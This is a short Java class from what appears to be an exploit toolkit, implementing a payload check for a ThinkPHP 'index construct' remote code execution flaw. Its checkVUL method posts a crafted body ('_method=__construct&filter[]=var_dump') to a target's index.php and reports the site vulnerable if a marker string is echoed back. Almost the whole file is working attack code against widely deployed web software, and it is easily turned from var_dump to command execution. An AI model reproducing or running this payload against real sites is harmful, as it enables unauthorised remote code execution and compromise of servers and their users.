package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_index_construct_rce implements BasePayload {
    private static final String CheckStr="11111";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.postHttpRequest(url + "/index.php?s=index/index/index", "utf-8","application/x-www-form-urlencoded","s="+CheckStr+"&_method=__construct&method&filter[]=var_dump");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}